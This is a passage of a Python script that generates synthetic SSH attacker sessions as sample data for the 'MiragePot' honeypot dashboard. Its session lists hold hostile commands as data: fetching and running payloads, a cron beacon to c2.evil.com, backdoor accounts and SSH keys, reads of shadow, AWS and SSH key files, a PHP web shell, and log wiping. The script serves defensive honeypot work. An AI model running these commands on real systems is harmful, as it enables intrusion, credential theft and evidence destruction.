        commands, honeytoken_files, command_entries
    )
    honeytokens_summary = generate_honeytokens_summary(honeytoken_accesses)

    download_attempts: List[Dict[str, Any]] = []

    return {
        "session_id": session_id,
        "attacker_ip": "45.141.84.197",
        "attacker_port": random.randint(32000, 65000),
        "login_time": format_timestamp(start_time),
        "logout_time": format_timestamp(end_time),
        "duration_seconds": round((end_time - start_time).total_seconds(), 2),
        "ssh_fingerprint": generate_ssh_fingerprint("automated"),
        "auth": generate_auth_summary("root", "toor", failed_attempts=0),
        "pty_info": generate_pty_info("intermediate"),
        "commands": command_entries,
        "download_attempts": download_attempts,
        "ttp_summary": ttp_summary,
        "honeytokens_summary": honeytokens_summary,
    }


def generate_session_3() -> Dict[str, Any]:
    """Session 3 - Payload Dropper (Intermediate)."""
    session_id = generate_session_id()
    start_time = generate_start_time(days_ago=7)

    commands = [
        "id",
        "uname -a",
        "cd /tmp",
        "wget http://91.197.232.200/b.sh",
        "chmod +x b.sh",
        "./b.sh",
        "ls -la",
        "ps aux",
    ]
    command_entries, end_time = generate_command_entries(commands, start_time)

    ttp_indicators = generate_ttp_indicators(commands, command_entries)
    ttp_summary = generate_ttp_summary(ttp_indicators)

    honeytoken_accesses: List[Dict[str, Any]] = []
    honeytokens_summary = generate_honeytokens_summary(honeytoken_accesses)

    download_attempts = generate_download_attempts(commands, command_entries)

    return {
        "session_id": session_id,
        "attacker_ip": "91.197.232.109",
        "attacker_port": random.randint(32000, 65000),
        "login_time": format_timestamp(start_time),
        "logout_time": format_timestamp(end_time),
        "duration_seconds": round((end_time - start_time).total_seconds(), 2),
        "ssh_fingerprint": generate_ssh_fingerprint("bot"),
        "auth": generate_auth_summary("admin", "admin", failed_attempts=0),
        "pty_info": generate_pty_info("intermediate"),
        "commands": command_entries,
        "download_attempts": download_attempts,
        "ttp_summary": ttp_summary,
        "honeytokens_summary": honeytokens_summary,
    }


def generate_session_4() -> Dict[str, Any]:
    """Session 4 - Full Recon Bot (Intermediate)."""
    session_id = generate_session_id()
    start_time = generate_start_time(days_ago=5)

    commands = [
        "whoami",
        "id",
        "uname -a",
        "cat /proc/cpuinfo",
        "cat /proc/meminfo",
        "df -h",
        "netstat -an",
        "ps aux",
        "ls -la /home",
        "ls -la /root",
        "cat /etc/os-release",
        "last",
        "w",
        "who",
    ]
    command_entries, end_time = generate_command_entries(commands, start_time)

    ttp_indicators = generate_ttp_indicators(commands, command_entries)
    ttp_summary = generate_ttp_summary(ttp_indicators)

    honeytoken_accesses: List[Dict[str, Any]] = []
    honeytokens_summary = generate_honeytokens_summary(honeytoken_accesses)

    download_attempts: List[Dict[str, Any]] = []

    return {
        "session_id": session_id,
        "attacker_ip": "222.186.42.117",
        "attacker_port": random.randint(32000, 65000),
        "login_time": format_timestamp(start_time),
        "logout_time": format_timestamp(end_time),
        "duration_seconds": round((end_time - start_time).total_seconds(), 2),
        "ssh_fingerprint": generate_ssh_fingerprint("bot"),
        "auth": generate_auth_summary("ubuntu", "ubuntu", failed_attempts=2),
        "pty_info": generate_pty_info("bot"),
        "commands": command_entries,
        "download_attempts": download_attempts,
        "ttp_summary": ttp_summary,
        "honeytokens_summary": honeytokens_summary,
    }


def generate_session_5() -> Dict[str, Any]:
    """Session 5 - Persistence Setter (Advanced)."""
    session_id = generate_session_id()
    start_time = generate_start_time(days_ago=5)

    commands = [
        "id",
        "whoami",
        "cat /etc/passwd",
        "useradd -m backdoor",
        'echo "backdoor:Password123" | chpasswd',
        "mkdir -p /root/.ssh",
        'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@pwned" >> /root/.ssh/authorized_keys',
        "crontab -l",
        'echo "* * * * * curl http://c2.evil.com/ping" | crontab -',
        "cat /root/.ssh/authorized_keys",
    ]
    command_entries, end_time = generate_command_entries(commands, start_time)

    ttp_indicators = generate_ttp_indicators(commands, command_entries)
    ttp_summary = generate_ttp_summary(ttp_indicators)

    honeytoken_files = ["/root/.ssh/authorized_keys"]
    honeytoken_accesses = generate_honeytoken_accesses(
        commands, honeytoken_files, command_entries
    )
    honeytokens_summary = generate_honeytokens_summary(honeytoken_accesses)

    download_attempts: List[Dict[str, Any]] = []

    return {
        "session_id": session_id,
        "attacker_ip": "194.165.16.72",
        "attacker_port": random.randint(32000, 65000),
        "login_time": format_timestamp(start_time),
        "logout_time": format_timestamp(end_time),
        "duration_seconds": round((end_time - start_time).total_seconds(), 2),
        "ssh_fingerprint": generate_ssh_fingerprint("sophisticated"),
        "auth": generate_auth_summary("root", "password", failed_attempts=0),
        "pty_info": generate_pty_info("advanced"),
        "commands": command_entries,
        "download_attempts": download_attempts,
        "ttp_summary": ttp_summary,
        "honeytokens_summary": honeytokens_summary,
    }


def generate_session_6() -> Dict[str, Any]:
    """Session 6 - Paranoid Attacker (Advanced)."""
    session_id = generate_session_id()
    start_time = generate_start_time(days_ago=5)

    commands = [
        "id",
        "whoami",
        "uname -a",
        "cat /etc/passwd",
        "cat /root/.aws/credentials",
        "wget http://103.75.190.100/implant",
        "chmod +x implant",
        "./implant",
        "unset HISTFILE",
        "export HISTSIZE=0",
        "export HISTFILESIZE=0",
        "cat /dev/null > ~/.bash_history",
        "shred -u /var/log/auth.log",
    ]
    command_entries, end_time = generate_command_entries(commands, start_time)

    ttp_indicators = generate_ttp_indicators(commands, command_entries)
    ttp_summary = generate_ttp_summary(ttp_indicators)

    honeytoken_files = ["/root/.aws/credentials"]
    honeytoken_accesses = generate_honeytoken_accesses(
        commands, honeytoken_files, command_entries
    )
    honeytokens_summary = generate_honeytokens_summary(honeytoken_accesses)

    download_attempts = generate_download_attempts(commands, command_entries)

    return {
        "session_id": session_id,
        "attacker_ip": "103.75.190.88",
        "attacker_port": random.randint(32000, 65000),
        "login_time": format_timestamp(start_time),
        "logout_time": format_timestamp(end_time),
        "duration_seconds": round((end_time - start_time).total_seconds(), 2),
        "ssh_fingerprint": generate_ssh_fingerprint("sophisticated"),
        "auth": generate_auth_summary("root", "root", failed_attempts=0),
        "pty_info": generate_pty_info("advanced"),
        "commands": command_entries,
        "download_attempts": download_attempts,
        "ttp_summary": ttp_summary,
        "honeytokens_summary": honeytokens_summary,
    }


def generate_session_7() -> Dict[str, Any]:
    """Session 7 - SSH Key Stealer (Intermediate)."""
    session_id = generate_session_id()
    start_time = generate_start_time(days_ago=3)

    commands = [
        "id",
        "ls /home",
        "ls /root/.ssh",
        "cat /root/.ssh/id_rsa",
        "cat /root/.ssh/id_rsa.pub",
        "cat /home/ubuntu/.ssh/id_rsa",
        "cat /root/.ssh/known_hosts",
    ]
    command_entries, end_time = generate_command_entries(commands, start_time)

    ttp_indicators = generate_ttp_indicators(commands, command_entries)
    ttp_summary = generate_ttp_summary(ttp_indicators)

    honeytoken_files = ["/root/.ssh/id_rsa", "/home/ubuntu/.ssh/id_rsa"]
    honeytoken_accesses = generate_honeytoken_accesses(
        commands, honeytoken_files, command_entries
    )
    honeytokens_summary = generate_honeytokens_summary(honeytoken_accesses)

    download_attempts: List[Dict[str, Any]] = []

    return {
        "session_id": session_id,
        "attacker_ip": "5.188.206.14",
        "attacker_port": random.randint(32000, 65000),
        "login_time": format_timestamp(start_time),
        "logout_time": format_timestamp(end_time),
        "duration_seconds": round((end_time - start_time).total_seconds(), 2),
        "ssh_fingerprint": generate_ssh_fingerprint("automated"),
        "auth": generate_auth_summary("root", "raspberry", failed_attempts=0),
        "pty_info": generate_pty_info("intermediate"),
        "commands": command_entries,
        "download_attempts": download_attempts,
        "ttp_summary": ttp_summary,
        "honeytokens_summary": honeytokens_summary,
    }


def generate_session_8() -> Dict[str, Any]:
    """Session 8 - Brute Force Leftover (Script Kiddie)."""
    session_id = generate_session_id()
    start_time = generate_start_time(days_ago=3)

    commands = ["id"]
    command_entries, end_time = generate_command_entries(commands, start_time)

    ttp_indicators = generate_ttp_indicators(commands, command_entries)
    ttp_summary = generate_ttp_summary(ttp_indicators)

    honeytoken_accesses: List[Dict[str, Any]] = []
    honeytokens_summary = generate_honeytokens_summary(honeytoken_accesses)

    download_attempts: List[Dict[str, Any]] = []

    return {
        "session_id": session_id,
        "attacker_ip": "178.128.23.145",
        "attacker_port": random.randint(32000, 65000),
        "login_time": format_timestamp(start_time),
        "logout_time": format_timestamp(end_time),
        "duration_seconds": round((end_time - start_time).total_seconds(), 2),
        "ssh_fingerprint": generate_ssh_fingerprint("scanner"),
        "auth": generate_auth_summary("pi", "raspberry", failed_attempts=5),
        "pty_info": generate_pty_info("script_kiddie"),
        "commands": command_entries,
        "download_attempts": download_attempts,
        "ttp_summary": ttp_summary,
        "honeytokens_summary": honeytokens_summary,
    }


def generate_session_9() -> Dict[str, Any]:
    """Session 9 - Web Shell Hunter (Intermediate)."""
    session_id = generate_session_id()
    start_time = generate_start_time(days_ago=1)

    commands = [
        "id",
        "whoami",
        'find / -name "*.php" -type f 2>/dev/null',
        "find /var/www -type f",
        "ls -la /var/www/html",
        "cat /var/www/html/.env",
        "cat /var/www/html/config.php",
        "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
        "curl http://localhost/shell.php?cmd=id",
    ]
    command_entries, end_time = generate_command_entries(commands, start_time)

    ttp_indicators = generate_ttp_indicators(commands, command_entries)
    ttp_summary = generate_ttp_summary(ttp_indicators)

    honeytoken_files = ["/var/www/html/.env", "/var/www/html/config.php"]
    honeytoken_accesses = generate_honeytoken_accesses(
        commands, honeytoken_files, command_entries
    )
    honeytokens_summary = generate_honeytokens_summary(honeytoken_accesses)

    download_attempts = generate_download_attempts(commands, command_entries)

    return {
        "session_id": session_id,
        "attacker_ip": "41.77.134.20",
        "attacker_port": random.randint(32000, 65000),
        "login_time": format_timestamp(start_time),
        "logout_time": format_timestamp(end_time),
        "duration_seconds": round((end_time - start_time).total_seconds(), 2),
        "ssh_fingerprint": generate_ssh_fingerprint("automated"),
        "auth": generate_auth_summary("www-data", "www-data", failed_attempts=0),
        "pty_info": generate_pty_info("intermediate"),
        "commands": command_entries,
        "download_attempts": download_attempts,
        "ttp_summary": ttp_summary,
        "honeytokens_summary": honeytokens_summary,
    }


def generate_session_10() -> Dict[str, Any]:
    """Session 10 - Advanced Persistent Threat (Advanced)."""
    session_id = generate_session_id()
    start_time = generate_start_time(days_ago=1)

    commands = [
        "id",
        "whoami",
        "uname -a",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "cat /root/.aws/credentials",
        "cat /root/.ssh/id_rsa",
        "ps aux",
        "netstat -an",
        "ss -tlnp",
        "ip addr",
        "ip route",
        "cat /proc/net/arp",
        "for i in 192.168.1.{1..10}; do ping -c1 $i; done",
        "cd /tmp",
        "wget http://58.220.219.100/implant.elf",
        "chmod +x implant.elf",
        "./implant.elf",
        "useradd -m -s /bin/bash svc_update",
        'echo "svc_update:Str0ngP@ss!" | chpasswd',
        "unset HISTFILE",
        "cat /dev/null > ~/.bash_history",
    ]
    command_entries, end_time = generate_command_entries(commands, start_time)

    ttp_indicators = generate_ttp_indicators(commands, command_entries)
    ttp_summary = generate_ttp_summary(ttp_indicators)

    honeytoken_files = ["/root/.aws/credentials", "/root/.ssh/id_rsa", "/etc/shadow"]
    honeytoken_accesses = generate_honeytoken_accesses(
        commands, honeytoken_files, command_entries
    )
    honeytokens_summary = generate_honeytokens_summary(honeytoken_accesses)

    download_attempts = generate_download_attempts(commands, command_entries)

    return {
        "session_id": session_id,
        "attacker_ip": "58.220.219.247",
        "attacker_port": random.randint(32000, 65000),
        "login_time": format_timestamp(start_time),
        "logout_time": format_timestamp(end_time),
        "duration_seconds": round((end_time - start_time).total_seconds(), 2),
        "ssh_fingerprint": generate_ssh_fingerprint("sophisticated"),
        "auth": generate_auth_summary("root", "admin123", failed_attempts=0),
        "pty_info": generate_pty_info("advanced"),
        "commands": command_entries,
        "download_attempts": download_attempts,
        "ttp_summary": ttp_summary,
        "honeytokens_summary": honeytokens_summary,
    }


# ============================================================================
# Main Functions
# ============================================================================


def clean_sample_data() -> None:
    """Clean existing sample data before regenerating."""
    print("Cleaning existing sample data...")

    # Remove session logs
    if LOGS_DIR.exists():
        for log_file in LOGS_DIR.glob("session_*.json"):
            log_file.unlink()
            print(f"  Deleted: {log_file.name}")

    # Remove profiles
    if PROFILES_DIR.exists():
        for profile_file in PROFILES_DIR.glob("*.json"):
            profile_file.unlink()
            print(f"  Deleted: {profile_file.name}")

    print("Clean complete.\n")


def generate_all_sessions() -> List[Dict[str, Any]]:
    """Generate all 10 session archetypes."""
    generators = [
        ("Quick Scanner", generate_session_1),
        ("Credential Harvester", generate_session_2),
        ("Payload Dropper", generate_session_3),
        ("Full Recon Bot", generate_session_4),
        ("Persistence Setter", generate_session_5),
        ("Paranoid Attacker", generate_session_6),
        ("SSH Key Stealer", generate_session_7),
        ("Brute Force Leftover", generate_session_8),
        ("Web Shell Hunter", generate_session_9),
        ("APT Simulation", generate_session_10),
    ]

    sessions = []
    for i, (name, generator) in enumerate(generators, 1):
        session = generator()
        sessions.append(session)
        print(f"Generating session {i}/10: {name} ({session['attacker_ip']})...")

    return sessions


def save_session_log(session: Dict[str, Any]) -> None:
    """Save session log to JSON file."""
    LOGS_DIR.mkdir(parents=True, exist_ok=True)

    session_id = session["session_id"]
    path = LOGS_DIR / f"{session_id}.json"

    path.write_text(json.dumps(session, indent=2), encoding="utf-8")


def save_attacker_profile(session: Dict[str, Any]) -> None:
    """Generate and save attacker profile."""
    PROFILES_DIR.mkdir(parents=True, exist_ok=True)

    # Calculate tier usage
    tier_usage = calculate_tier_usage([cmd["command"] for cmd in session["commands"]])

    # Calculate tier percentages
    total_commands = len(session["commands"])
    tier_percentages = {
        "filesystem": round(tier_usage["filesystem"] / max(total_commands, 1) * 100, 1),
        "cache": round(tier_usage["cache"] / max(total_commands, 1) * 100, 1),
        "llm": round(tier_usage["llm"] / max(total_commands, 1) * 100, 1),
    }

    # Determine skill level (simplified heuristic)
    ttp_summary = session["ttp_summary"]
    honeytoken_summary = session["honeytokens_summary"]

    if (
        ttp_summary["risk_level"] in ("high", "critical")
        and honeytoken_summary.get("unique_tokens_accessed", 0) > 0
        and len(ttp_summary["stages_seen"]) >= 3
    ):
        skill_level = "Advanced"
    elif (
        ttp_summary["risk_level"] in ("medium", "high")
        or len(ttp_summary["stages_seen"]) >= 2
    ):
        skill_level = "Intermediate"
    else:
        skill_level = "Script Kiddie"

    profile = {
        "session_id": session["session_id"],
        "attacker_ip": session["attacker_ip"],
        "login_time": session["login_time"],
        "duration_seconds": session["duration_seconds"],
        "skill_level": skill_level,
        "total_commands": total_commands,
        "tier_usage": tier_usage,
        "tier_percentages": tier_percentages,
        "ttp_summary": ttp_summary,
        "honeytokens_summary": honeytoken_summary,
        "download_attempts_count": len(session["download_attempts"]),
        "generated_at": format_timestamp(datetime.now(timezone.utc)),
    }

    # Save profile
    session_id = session["session_id"]
    timestamp = int(datetime.now(timezone.utc).timestamp())
    filename = f"{session_id}_{timestamp}.json"
    path = PROFILES_DIR / filename

    path.write_text(json.dumps(profile, indent=2), encoding="utf-8")


def main() -> None:
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="Generate sample data for MiragePot honeypot dashboard"
    )
    parser.add_argument(
        "--clean",
        action="store_true",
        help="Clean existing sample data before generating new data",
    )
    args = parser.parse_args()

    print("=" * 70)
    print("MiragePot Sample Data Generator")
    print("=" * 70)
    print()

    if args.clean:
        clean_sample_data()

    # Generate all sessions
    sessions = generate_all_sessions()
    print()

    # Save sessions and profiles
    print("Saving session logs and profiles...")
    for session in sessions:
        save_session_log(session)
        save_attacker_profile(session)

    # Calculate summary statistics
    total_commands = sum(len(s["commands"]) for s in sessions)
    total_ttp_detections = sum(s["ttp_summary"]["total_indicators"] for s in sessions)
    total_honeytoken_accesses = sum(
        s["honeytokens_summary"]["unique_tokens_accessed"] for s in sessions
    )

    print()
    print("=" * 70)
    print(
        f"Done. {len(sessions)} sessions | {total_commands} commands | "
        f"{total_ttp_detections} TTP detections | {total_honeytoken_accesses} honeytoken accesses written."
    )
    print("=" * 70)
    print()
    print("Data locations:")
    print(f"  - Session logs: {LOGS_DIR}")
    print(f"  - Profiles:     {PROFILES_DIR}")
    print()
    print("Start the dashboard with: ./start.sh")


if __name__ == "__main__":
    main()
